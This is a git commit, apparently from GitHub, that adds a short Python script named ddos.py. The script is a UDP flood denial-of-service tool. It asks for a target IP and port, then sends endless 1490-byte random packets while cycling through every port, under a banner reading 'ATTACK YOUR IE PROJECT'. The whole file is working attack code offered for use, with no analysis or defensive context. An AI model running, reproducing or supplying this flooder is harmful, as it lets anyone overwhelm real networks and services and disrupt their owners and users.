83930913e6259fb528c52daa3c541151d5c9f726
Duchenne0080 <64134744+Duchenne0080@users.noreply.github.com>
2020-09-02 11:06:17 +1000

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,40 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet ATTACK YOUR IE PROJECT")
+print
+print ("Author   : TA-04")
+print ("github   : ")
+print
+ip = input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+
+sent = 0
+port = int(port)
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     if port == 65534:
+       port = 1
